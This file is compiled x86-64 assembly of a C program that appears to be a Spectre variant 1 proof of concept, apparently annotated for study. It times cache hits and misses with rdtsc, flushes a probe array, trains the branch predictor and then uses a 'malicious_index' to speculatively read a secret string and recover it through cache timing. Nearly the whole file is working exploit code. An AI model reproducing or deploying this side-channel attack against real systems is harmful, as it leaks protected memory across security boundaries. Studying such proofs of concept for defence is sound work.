	.file	"visualized.c"
# GNU C17 (Ubuntu 9.4.0-1ubuntu1~20.04.1) version 9.4.0 (x86_64-linux-gnu)
#	compiled by GNU C version 9.4.0, GMP version 6.2.0, MPFR version 4.0.2, MPC version 1.1.0, isl version isl-0.22.1-GMP

# GGC heuristics: --param ggc-min-expand=100 --param ggc-min-heapsize=131072
# options passed:  -imultiarch x86_64-linux-gnu visualized.c -mtune=generic
# -march=x86-64 -fverbose-asm -fasynchronous-unwind-tables
# -fstack-protector-strong -Wformat -Wformat-security
# -fstack-clash-protection -fcf-protection
# options enabled:  -fPIC -fPIE -faggressive-loop-optimizations
# -fassume-phsa -fasynchronous-unwind-tables -fauto-inc-dec -fcommon
# -fdelete-null-pointer-checks -fdwarf2-cfi-asm -fearly-inlining
# -feliminate-unused-debug-types -ffp-int-builtin-inexact -ffunction-cse
# -fgcse-lm -fgnu-runtime -fgnu-unique -fident -finline-atomics
# -fipa-stack-alignment -fira-hoist-pressure -fira-share-save-slots
# -fira-share-spill-slots -fivopts -fkeep-static-consts
# -fleading-underscore -flifetime-dse -flto-odr-type-merging -fmath-errno
# -fmerge-debug-strings -fpeephole -fplt -fprefetch-loop-arrays
# -freg-struct-return -fsched-critical-path-heuristic
# -fsched-dep-count-heuristic -fsched-group-heuristic -fsched-interblock
# -fsched-last-insn-heuristic -fsched-rank-heuristic -fsched-spec
# -fsched-spec-insn-heuristic -fsched-stalled-insns-dep -fschedule-fusion
# -fsemantic-interposition -fshow-column -fshrink-wrap-separate
# -fsigned-zeros -fsplit-ivs-in-unroller -fssa-backprop
# -fstack-clash-protection -fstack-protector-strong -fstdarg-opt
# -fstrict-volatile-bitfields -fsync-libcalls -ftrapping-math -ftree-cselim
# -ftree-forwprop -ftree-loop-if-convert -ftree-loop-im -ftree-loop-ivcanon
# -ftree-loop-optimize -ftree-parallelize-loops= -ftree-phiprop
# -ftree-reassoc -ftree-scev-cprop -funit-at-a-time -funwind-tables
# -fverbose-asm -fzero-initialized-in-bss -m128bit-long-double -m64 -m80387
# -malign-stringops -mavx256-split-unaligned-load
# -mavx256-split-unaligned-store -mfancy-math-387 -mfp-ret-in-387 -mfxsr
# -mglibc -mieee-fp -mlong-double-80 -mmmx -mno-sse4 -mpush-args -mred-zone
# -msse -msse2 -mstv -mtls-direct-seg-refs -mvzeroupper

	.text
	.globl	arr1_size
	.data
	.align 4
	.type	arr1_size, @object
	.size	arr1_size, 4
arr1_size:
	.long	16
	.globl	arr1
	.align 16
	.type	arr1, @object
	.size	arr1, 16
arr1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.comm	arr2,131072,32
	.globl	secret
	.section	.rodata
.LC0:
	.string	"This is the sensitive data"
	.section	.data.rel.local,"aw"
	.align 8
	.type	secret, @object
	.size	secret, 8
secret:
	.quad	.LC0
	.text
	.type	Load, @function
Load:
.LFB4262:
	.cfi_startproc
	pushq	%rbp	#
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp	#,
	.cfi_def_cfa_register 6
	movq	%rdi, -24(%rbp)	# addr, addr
# visualized.c:17:     asm __volatile__(
	movq	-24(%rbp), %rax	# addr, tmp85
	movq	%rax, %rcx	# tmp85, tmp85
#APP
# 17 "visualized.c" 1
	 movl (%rcx), %eax 	# tmp85

# 0 "" 2
#NO_APP
	movl	%eax, -4(%rbp)	# tmp84, val
# visualized.c:23:     return (val);
	movl	-4(%rbp), %eax	# val, _4
# visualized.c:24: }
	popq	%rbp	#
	.cfi_def_cfa 7, 8
	ret	
	.cfi_endproc
.LFE4262:
	.size	Load, .-Load
	.type	LoadAndMeasure, @function
LoadAndMeasure:
.LFB4263:
	.cfi_startproc
	pushq	%rbp	#
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp	#,
	.cfi_def_cfa_register 6
	movq	%rdi, -24(%rbp)	# addr, addr
# visualized.c:29:     asm __volatile__(
	movq	-24(%rbp), %rax	# addr, tmp85
	movq	%rax, %rcx	# tmp85, tmp85
#APP
# 29 "visualized.c" 1
	 mfence 
 rdtsc 
 lfence 
 movl %eax, %esi 
 movl (%rcx), %eax 	# tmp85
 lfence 
 rdtsc 
 subl %esi, %eax
# 0 "" 2
#NO_APP
	movl	%eax, -4(%rbp)	# tmp84, val
# visualized.c:42:     return (val);
	movl	-4(%rbp), %eax	# val, _4
# visualized.c:44: }
	popq	%rbp	#
	.cfi_def_cfa 7, 8
	ret	
	.cfi_endproc
.LFE4263:
	.size	LoadAndMeasure, .-LoadAndMeasure
	.section	.rodata
	.align 8
.LC1:
	.string	"hit time in this machine is %d\n"
	.align 8
.LC2:
	.string	"misstime in this machine is %d\n"
.LC3:
	.string	"load secret time is %d \n"
.LC4:
	.string	"load array2 84 time is %d \n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB4264:
	.cfi_startproc
	endbr64	
	pushq	%rbp	#
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp	#,
	.cfi_def_cfa_register 6
	subq	$96, %rsp	#,
	movl	%edi, -84(%rbp)	# argc, argc
	movq	%rsi, -96(%rbp)	# argv, argv
# visualized.c:50:   size_t malicious_index = (size_t) (secret - (char*)arr1 ); 
	movq	secret(%rip), %rax	# secret, secret.0_1
	leaq	arr1(%rip), %rdx	#, tmp110
	subq	%rdx, %rax	# tmp110, _2
# visualized.c:50:   size_t malicious_index = (size_t) (secret - (char*)arr1 ); 
	movq	%rax, -48(%rbp)	# _2, malicious_index
# visualized.c:52:   for (int j = 0 ; j  < 256*512; ++j) arr2[j] = 1;
	movl	$0, -76(%rbp)	#, j
# visualized.c:52:   for (int j = 0 ; j  < 256*512; ++j) arr2[j] = 1;
	jmp	.L6	#
.L7:
# visualized.c:52:   for (int j = 0 ; j  < 256*512; ++j) arr2[j] = 1;
	movl	-76(%rbp), %eax	# j, tmp112
	cltq
	leaq	arr2(%rip), %rdx	#, tmp113
	movb	$1, (%rax,%rdx)	#, arr2
# visualized.c:52:   for (int j = 0 ; j  < 256*512; ++j) arr2[j] = 1;
	addl	$1, -76(%rbp)	#, j
.L6:
# visualized.c:52:   for (int j = 0 ; j  < 256*512; ++j) arr2[j] = 1;
	cmpl	$131071, -76(%rbp)	#, j
	jle	.L7	#,
# visualized.c:54:   int hit_time = LoadAndMeasure(&arr2[256*512]); 
	leaq	131072+arr2(%rip), %rdi	#,
	call	LoadAndMeasure	#
# visualized.c:54:   int hit_time = LoadAndMeasure(&arr2[256*512]); 
	movl	%eax, -64(%rbp)	# _3, hit_time
# visualized.c:55:   printf("hit time in this machine is %d\n", hit_time);
	movl	-64(%rbp), %eax	# hit_time, tmp114
	movl	%eax, %esi	# tmp114,
	leaq	.LC1(%rip), %rdi	#,
	movl	$0, %eax	#,
	call	printf@PLT	#
	leaq	131072+arr2(%rip), %rax	#, tmp115
	movq	%rax, -24(%rbp)	# tmp115, __A
# /usr/lib/gcc/x86_64-linux-gnu/9/include/emmintrin.h:1498:   __builtin_ia32_clflush (__A);
	movq	-24(%rbp), %rax	# __A, tmp116
	clflush	(%rax)	# tmp116
# /usr/lib/gcc/x86_64-linux-gnu/9/include/emmintrin.h:1499: }
	nop	
# visualized.c:58:   int miss_time = LoadAndMeasure(&arr2[256*512]);
	leaq	131072+arr2(%rip), %rdi	#,
	call	LoadAndMeasure	#
# visualized.c:58:   int miss_time = LoadAndMeasure(&arr2[256*512]);
	movl	%eax, -60(%rbp)	# _4, miss_time
# visualized.c:59:   printf("misstime in this machine is %d\n", miss_time);
	movl	-60(%rbp), %eax	# miss_time, tmp117
	movl	%eax, %esi	# tmp117,
	leaq	.LC2(%rip), %rdi	#,
	movl	$0, %eax	#,
	call	printf@PLT	#
# visualized.c:61:   __sync_synchronize();
	mfence	
# visualized.c:66:   int threshold = hit_time + 20;  
	movl	-64(%rbp), %eax	# hit_time, tmp121
	addl	$20, %eax	#, tmp120
	movl	%eax, -56(%rbp)	# tmp120, threshold
# visualized.c:69:   for (int i = 0; i < 256; i++){
	movl	$0, -72(%rbp)	#, i
# visualized.c:69:   for (int i = 0; i < 256; i++){
	jmp	.L8	#
.L9:
# visualized.c:70:     _mm_clflush(&arr2[i * 512]); 
	movl	-72(%rbp), %eax	# i, tmp122
	sall	$9, %eax	#, _5
# visualized.c:70:     _mm_clflush(&arr2[i * 512]); 
	cltq
	leaq	arr2(%rip), %rdx	#, tmp124
	addq	%rdx, %rax	# tmp124, _6
	movq	%rax, -16(%rbp)	# _6, __A
# /usr/lib/gcc/x86_64-linux-gnu/9/include/emmintrin.h:1498:   __builtin_ia32_clflush (__A);
	movq	-16(%rbp), %rax	# __A, tmp125
	clflush	(%rax)	# tmp125
# /usr/lib/gcc/x86_64-linux-gnu/9/include/emmintrin.h:1499: }
	nop	
# visualized.c:71:     asm __volatile__(" mfence \n");
#APP
# 71 "visualized.c" 1
	 mfence 

# 0 "" 2
# visualized.c:69:   for (int i = 0; i < 256; i++){
#NO_APP
	addl	$1, -72(%rbp)	#, i
.L8:
# visualized.c:69:   for (int i = 0; i < 256; i++){
	cmpl	$255, -72(%rbp)	#, i
	jle	.L9	#,
# visualized.c:74:   training_x = 50 % arr1_size;
	movl	arr1_size(%rip), %ecx	# arr1_size, arr1_size.1_7
	movl	$50, %eax	#, tmp126
	movl	$0, %edx	#, tmp127
	divl	%ecx	# arr1_size.1_7
	movl	%edx, %eax	# tmp127, _8
# visualized.c:74:   training_x = 50 % arr1_size;
	movl	%eax, %eax	# _8, tmp151
	movq	%rax, -40(%rbp)	# tmp151, training_x
# visualized.c:76:   for ( int t = 29;  t >= 0; t--) {
	movl	$29, -68(%rbp)	#, t
# visualized.c:76:   for ( int t = 29;  t >= 0; t--) {
	jmp	.L10	#
.L14:
	leaq	arr1_size(%rip), %rax	#, tmp129
	movq	%rax, -8(%rbp)	# tmp129, __A
# /usr/lib/gcc/x86_64-linux-gnu/9/include/emmintrin.h:1498:   __builtin_ia32_clflush (__A);
	movq	-8(%rbp), %rax	# __A, tmp130
	clflush	(%rax)	# tmp130
# /usr/lib/gcc/x86_64-linux-gnu/9/include/emmintrin.h:1499: }
	nop	
# visualized.c:78:     asm __volatile__(" mfence \n");
#APP
# 78 "visualized.c" 1
	 mfence 

# 0 "" 2
# visualized.c:80:     for (volatile int z = 0; z < 100; z++) {} // delay
#NO_APP
	movl	$0, -80(%rbp)	#, z
# visualized.c:80:     for (volatile int z = 0; z < 100; z++) {} // delay
	jmp	.L11	#
.L12:
# visualized.c:80:     for (volatile int z = 0; z < 100; z++) {} // delay
	movl	-80(%rbp), %eax	# z, z.2_9
	addl	$1, %eax	#, _10
	movl	%eax, -80(%rbp)	# _10, z
.L11:
# visualized.c:80:     for (volatile int z = 0; z < 100; z++) {} // delay
	movl	-80(%rbp), %eax	# z, z.3_11
# visualized.c:80:     for (volatile int z = 0; z < 100; z++) {} // delay
	cmpl	$99, %eax	#, z.3_11
	jle	.L12	#,
# visualized.c:82:     x = ((t % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
	movl	-68(%rbp), %ecx	# t, tmp131
	movslq	%ecx, %rax	# tmp131, tmp132
	imulq	$715827883, %rax, %rax	#, tmp132, tmp133
	shrq	$32, %rax	#, tmp133
	movq	%rax, %rdx	# tmp133, tmp134
	movl	%ecx, %eax	# tmp131, tmp135
	sarl	$31, %eax	#, tmp135
	subl	%eax, %edx	# tmp135, _12
	movl	%edx, %eax	# _12, tmp136
	addl	%eax, %eax	# tmp136
	addl	%edx, %eax	# _12, tmp136
	addl	%eax, %eax	# tmp137
	subl	%eax, %ecx	# tmp136, tmp131
	movl	%ecx, %edx	# tmp131, _12
# visualized.c:82:     x = ((t % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
	leal	-1(%rdx), %eax	#, _13
# visualized.c:82:     x = ((t % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
	movw	$0, %ax	#, _14
# visualized.c:82:     x = ((t % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
	cltq
	movq	%rax, -32(%rbp)	# tmp138, x
# visualized.c:83:     x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
	movq	-32(%rbp), %rax	# x, tmp139
	shrq	$16, %rax	#, _15
# visualized.c:83:     x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
	orq	%rax, -32(%rbp)	# _15, x
# visualized.c:84:     x = training_x ^ (x & (malicious_index ^ training_x)); // x = tranning_x for normal behaviour when previous x = 0, x = malicious_index when previous x = -1 
	movq	-48(%rbp), %rax	# malicious_index, tmp140
	xorq	-40(%rbp), %rax	# training_x, _16
# visualized.c:84:     x = training_x ^ (x & (malicious_index ^ training_x)); // x = tranning_x for normal behaviour when previous x = 0, x = malicious_index when previous x = -1 
	andq	-32(%rbp), %rax	# x, _17
# visualized.c:84:     x = training_x ^ (x & (malicious_index ^ training_x)); // x = tranning_x for normal behaviour when previous x = 0, x = malicious_index when previous x = -1 
	xorq	-40(%rbp), %rax	# training_x, tmp142
	movq	%rax, -32(%rbp)	# tmp142, x
# visualized.c:87:     if (x < arr1_size){
	movl	arr1_size(%rip), %eax	# arr1_size, arr1_size.4_18
	movl	%eax, %eax	# arr1_size.4_18, _19
# visualized.c:87:     if (x < arr1_size){
	cmpq	%rax, -32(%rbp)	# _19, x
	jnb	.L13	#,
# asm __volatile__(" nop \n  nop \n  nop \n  nop \n  nop \n");
#APP
	nop 
  nop 
  nop 
  nop 
  nop 
#NO_APP
	leaq	arr1(%rip), %rdx	#  => get the arr1 addr
	movq	-32(%rbp), %rax	  # => get the x value
	addq	%rdx, %rax	      # => add the offset of x
	movzbl	(%rax), %eax	  # => move into eax
	movzbl	%al, %eax	
# finished arr[x], 
	sall	$9, %eax	 
# shifted the valud by 512
	cltq
	leaq	arr2(%rip), %rdx	#, tmp147
	addq	%rdx, %rax	
	movq	%rax, %rdi	
	call	Load	#
.L13:
# visualized.c:76:   for ( int t = 29;  t >= 0; t--) {
	subl	$1, -68(%rbp)	#, t
.L10:
# visualized.c:76:   for ( int t = 29;  t >= 0; t--) {
	cmpl	$0, -68(%rbp)	#, t
	jns	.L14	#,
# visualized.c:94:   int test = LoadAndMeasure(secret);
	movq	secret(%rip), %rax	# secret, secret.5_24
	movq	%rax, %rdi	# secret.5_24,
	call	LoadAndMeasure	#
# visualized.c:94:   int test = LoadAndMeasure(secret);
	movl	%eax, -52(%rbp)	# _25, test
# visualized.c:95:   printf("load secret time is %d \n", test);
	movl	-52(%rbp), %eax	# test, tmp148
	movl	%eax, %esi	# tmp148,
	leaq	.LC3(%rip), %rdi	#,
	movl	$0, %eax	#,
	call	printf@PLT	#
# visualized.c:96:   test = LoadAndMeasure( & arr2[84 * 512]);
	leaq	43008+arr2(%rip), %rdi	#,
	call	LoadAndMeasure	#
# visualized.c:96:   test = LoadAndMeasure( & arr2[84 * 512]);
	movl	%eax, -52(%rbp)	# _26, test
# visualized.c:97:   printf("load array2 84 time is %d \n", test);
	movl	-52(%rbp), %eax	# test, tmp149
	movl	%eax, %esi	# tmp149,
	leaq	.LC4(%rip), %rdi	#,
	movl	$0, %eax	#,
	call	printf@PLT	#
# visualized.c:99:   return 0;
	movl	$0, %eax	#, _55
# visualized.c:101: }
	leave	
	.cfi_def_cfa 7, 8
	ret	
	.cfi_endproc
.LFE4264:
	.size	main, .-main
	.ident	"GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	 1f - 0f
	.long	 4f - 1f
	.long	 5
0:
	.string	 "GNU"
1:
	.align 8
	.long	 0xc0000002
	.long	 3f - 2f
2:
	.long	 0x3
3:
	.align 8
4:
